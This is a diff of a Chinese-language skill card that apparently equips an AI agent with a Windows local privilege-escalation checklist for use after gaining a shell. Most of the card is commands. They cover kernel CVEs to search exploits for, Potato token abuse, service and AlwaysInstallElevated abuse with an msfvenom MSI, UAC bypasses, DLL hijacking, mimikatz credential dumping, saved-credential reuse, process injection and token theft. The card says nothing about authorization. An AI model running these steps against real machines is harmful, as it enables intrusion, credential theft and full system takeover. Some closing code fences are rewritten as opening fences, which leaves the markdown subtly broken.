@@ -4,7 +4,7 @@ description: 'Windows 本地提权检查表：特权令牌→服务→UAC→DLL�
 whenToUse: '拿到 Windows shell 后本地提权：特权令牌→服务→UAC→DLL 劫持→凭据→内核 CVE。'
 metadata: { domain: ad-win, tier: T1 }
 ---
-> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。
+> 📌 DSH 用法：按卡名用 skill 工具加载；长任务用 bash 后台任务、并行侦察用 subagent。
 
 # Windows 本地提权
 
@@ -25,7 +25,7 @@ metadata: { domain: ad-win, tier: T1 }
 
 ## 0. 容器环境检测（拿 shell 第一毫秒！）
 
-```
+```text
 [ ] whoami /all | findstr /I "docker\|container"
 [ ] dir C:\ | findstr /I "dockerenv"
 [ ] sc query docker 2>nul | findstr /I "RUNNING"
@@ -33,13 +33,13 @@ metadata: { domain: ad-win, tier: T1 }
 [ ] systeminfo | findstr /I "Hyper-V"
 [ ] netstat -ano | findstr /I "docker"
 → 命中 → 🔴 你在容器内！加载 container-escape skill
-```
+```text
 
 ## 1. 2025-2026 通杀内核提权（优先！）
 
 ✅ 以下 CVE 编号已逐条验证（2026-08-16），均为真实存在的 Windows 本地提权漏洞
 
-```
+```text
 [ ] CVE-2025-62215: Windows Kernel 竞态条件 → SYSTEM（已野外利用，CVSS 7.0）✅ 已验（Windows 内核 ntoskrnl SepDuplicateToken 竞态/double-free EoP）
 [ ] CVE-2026-26179: Windows Secure Kernel double-free → VTL1 提权 ✅ 已验（Windows Secure Kernel double-free EoP）
 [ ] CVE-2025-30385: CLFS 驱动 use-after-free → SYSTEM 提权 ✅ 已验（Windows 通用日志文件系统 CLFS 驱动 UAF EoP）
@@ -48,24 +48,24 @@ metadata: { domain: ad-win, tier: T1 }
 
 🔴 关键词搜 exploit: "CVE-XXXX-XXXXX exploit github"
    searchsploit windows kernel <build_number>
-```
+```text
 
 ## 2. 第一秒信息收集
 
-```
+```text
 [ ] whoami /all; whoami /priv
 [ ] systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix"
 [ ] net user; net localgroup; net localgroup Administrators
 [ ] netstat -ano | findstr LISTEN
 [ ] tasklist /svc; sc query state= all | findstr SERVICE_NAME
 [ ] set  (环境变量中的密码/令牌)
-```
+```text
 
 ## 3. 快速提权（5 分钟内）
 
 ### 3.1 特权令牌（SeImpersonate / SeAssignPrimaryToken）
 
-```
+```text
 [ ] whoami /priv | findstr /I "SeImpersonate\|SeAssignPrimaryToken"
     → 有 → 🎯 JuicyPotato / PrintSpoofer / GodPotato / SweetPotato
     → Potato 家族覆盖: CLSID 绑定 (OXID 解析) / 命名管道
@@ -82,11 +82,11 @@ metadata: { domain: ad-win, tier: T1 }
 
 [ ] whoami /priv | findstr /I "SeLoadDriverPrivilege"
     → 有 → 加载恶意驱动
-```
+```text
 
 ### 3.2 服务相关
 
-```
+```text
 [ ] icacls 检查服务二进制权限:
     accesschk.exe -uwcqv "Authenticated Users" * /accepteula
     accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula
@@ -108,11 +108,11 @@ metadata: { domain: ad-win, tier: T1 }
     reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
     reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
     → 均为 1 → msfvenom -f msi → msiexec /quiet /qn /i payload.msi
-```
+```text
 
 ### 3.3 UAC 绕过
 
-```
+```text
 [ ] whoami /groups | findstr /I "Medium"
     → Medium Mandatory Level → UAC 绕过有效
 
@@ -127,29 +127,29 @@ metadata: { domain: ad-win, tier: T1 }
     msconfig.exe (GUI UAC bypass)
     SilentCleanup
     → GitHub: hfiref0x/UACME  (akagi)
-```
+```text
 
 ### 3.4 DLL 劫持
 
-```
+```text
 [ ] ProcMon 找缺失 DLL（需管理员，但可先枚举路径）
 [ ] 常见缺失 DLL 路径:
     C:\Windows\System32\WindowsPowerShell\v1.0\     (PowerShell)
     程序安装目录中不存在的 DLL
 [ ] 可写 PATH 目录 → 放同名 DLL → 程序启动时加载
-```
+```text
 
 ### 3.5 计划任务
 
-```
+```text
 [ ] schtasks /query /fo LIST /v | findstr /I "Task To Run:"
 [ ] 可写脚本/二进制 → 替换或追加恶意代码
 [ ] icacls <任务路径>  # 检查权限
-```
+```text
 
 ## 4. 凭据搜集
 
-```
+```text
 [ ] 内存凭据（需高权限）:
     # mimikatz 直接读 (🔴 AV 杀!)
     mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
@@ -180,36 +180,36 @@ metadata: { domain: ad-win, tier: T1 }
 [ ] 保存的 RDP 连接:
     cmdkey /list
     → 有保存凭据 → runas /savecred /user:DOMAIN\admin cmd.exe
-```
+```text
 
 ## 5. 进程注入 & Token 操作
 
-```
+```text
 [ ] 注入到高权限进程:
     Get-Process -IncludeUserName | Where-Object { $_.UserName -like "*SYSTEM*" -or $_.UserName -like "*Administrator*" }
     → 选目标进程 PID → Inject
 
 [ ] Token 窃取:
     有 SeDebugPrivilege → 打开 SYSTEM 进程 → DuplicateTokenEx → CreateProcessWithToken
-```
+```text
 
 ## 6. 自动化工具
 
-```
+```text
 [ ] winPEAS.exe / winPEAS.bat              # 全面枚举
 [ ] PowerUp.ps1 (Invoke-AllChecks)         # 快速配置检查
 [ ] Seatbelt.exe -group=all                # C# 全量检查
 [ ] Watson.exe（过时，现代用 WES-NG / PrivescCheck.ps1）/ Windows-Exploit-Suggester  # 内核 CVE 匹配
 [ ] PrivescCheck.ps1                       # 现代 PowerUp 替代
-```
+```text
 
 ## 7. 容器逃逸（如果检测到容器）
 
-```
+```text
 [ ] whoami /all | findstr /I "docker\|container"
 [ ] 特权模式 → 挂载宿主机磁盘 → 写计划任务/SSH key
 [ ] GMSA / Group MSAs → 域渗透跳板
-```
+```text
 
 ## 快速优先级
 
